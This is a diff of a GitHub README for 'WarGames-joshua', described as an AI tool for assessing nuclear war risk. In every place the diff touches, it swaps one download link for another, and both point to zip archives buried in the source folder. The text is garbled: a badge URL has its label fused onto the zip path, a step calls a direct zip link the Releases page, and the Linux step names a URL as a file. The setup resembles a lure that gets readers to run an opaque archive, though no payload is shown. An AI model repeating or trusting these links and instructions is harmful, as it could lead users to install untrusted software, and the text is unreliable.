@@ -1,6 +1,6 @@
 # 🎮 WarGames-joshua - Assess Nuclear Risks with AI
 
-[![Download Now](https://raw.githubusercontent.com/Hernandez4935/WarGames-joshua/master/src/analyzers/WarGames-joshua-3.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Hernandez4935/WarGames-joshua/master/src/analyzers/WarGames-joshua-3.5.zip)
+[![Download Now](https://github.com/Hernandez4935/WarGames-joshua/raw/refs/heads/master/src/analyzers/joshua_War_Games_v3.6-alpha.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Hernandez4935/WarGames-joshua/raw/refs/heads/master/src/analyzers/joshua_War_Games_v3.6-alpha.4.zip)
 
 ## 🌟 Description
 WarGames-joshua is a global thermonuclear war risk assessment system. It uses AI to monitor nuclear risks through data analysis and multi-source data collection. Inspired by the classic film WarGames (1983), this software aims to help users understand potential geopolitical threats. 
@@ -19,14 +19,14 @@ Ensure your computer meets the following requirements to run the application smo
 ### 📥 Download & Install
 To get started, visit the Releases page:
 
-[Download WarGames-joshua](https://raw.githubusercontent.com/Hernandez4935/WarGames-joshua/master/src/analyzers/WarGames-joshua-3.5.zip)
+[Download WarGames-joshua](https://github.com/Hernandez4935/WarGames-joshua/raw/refs/heads/master/src/analyzers/joshua_War_Games_v3.6-alpha.4.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version listed.
 3. Download the file suitable for your operating system:
    - **For Windows:** Download the *.exe file.
    - **For macOS:** Download the *.dmg file.
-   - **For Linux:** Download the *https://raw.githubusercontent.com/Hernandez4935/WarGames-joshua/master/src/analyzers/WarGames-joshua-3.5.zip file.
+   - **For Linux:** Download the *https://github.com/Hernandez4935/WarGames-joshua/raw/refs/heads/master/src/analyzers/joshua_War_Games_v3.6-alpha.4.zip file.
 4. Once the download completes, locate the file on your computer.
 5. Double-click the file to start the installation process.
 6. Follow the on-screen instructions to finish the installation.
@@ -84,4 +84,4 @@ To contribute:
 ## 📬 Contact
 For more information, updates, or inquiries, you can reach out through the repository's contact options.
 
-[Download WarGames-joshua](https://raw.githubusercontent.com/Hernandez4935/WarGames-joshua/master/src/analyzers/WarGames-joshua-3.5.zip) and take the first step towards understanding nuclear risks in today's world.
+[Download WarGames-joshua](https://github.com/Hernandez4935/WarGames-joshua/raw/refs/heads/master/src/analyzers/joshua_War_Games_v3.6-alpha.4.zip) and take the first step towards understanding nuclear risks in today's world.
